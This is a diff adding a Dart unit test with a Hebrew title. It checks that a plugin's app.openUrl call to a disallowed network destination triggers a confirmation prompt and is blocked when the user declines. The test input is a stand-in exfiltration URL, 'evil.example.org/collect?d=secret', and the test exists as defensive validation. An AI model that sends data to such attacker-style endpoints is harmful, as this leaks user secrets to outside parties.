@@ -1027,6 +1027,44 @@ Future<void> main() async {
     });
 
     test(
+      'app.openUrl ליעד שאינו מותר לתוסף ברשת מבקש אישור, וסירוב אינו פותח',
+      () async {
+        final prompts = <String>[];
+        final gated = PluginBridgeAdapter(
+          _buildInstalledPlugin(permissions: const ['app.open_url']),
+          dependencies: PluginBridgeDependencies(
+            historyBloc: _MockHistoryBloc(),
+            tabsBloc: _StubTabsBloc(),
+            navigationBloc: _MockNavigationBloc(),
+            calendarCubit: _StubCalendarCubit(
+              _buildCalendarState(DateTime(2026, 1, 1), inIsrael: true),
+            ),
+            workspaceBloc: _MockWorkspaceBloc(),
+            searchRepository: _MockSearchRepository(),
+            personalNotesRepository: _MockPersonalNotesRepository(),
+            bookOpenCoordinator: _MockBookOpenCoordinator(),
+            themePayloadBuilder: () => <String, dynamic>{},
+            showConfirmDialog: ({required title, required content}) async {
+              prompts.add(content);
+              return false;
+            },
+            showWarningDialog:
+                ({required title, required content, required subtitle}) async =>
+                    true,
+          ),
+          pluginRepository: _StubPluginRegistryRepository(),
+        );
+
+        final result = await gated.execute('app', 'openUrl', {
+          'url': 'https://evil.example.org/collect?d=secret',
+        });
+
+        expect(result, isFalse);
+        expect(prompts.single, contains('evil.example.org'));
+      },
+    );
+
+    test(
       'reader.getCurrentRef returns current reference for active pdf tab',
       () async {
         final currentTab = PdfBookTab(
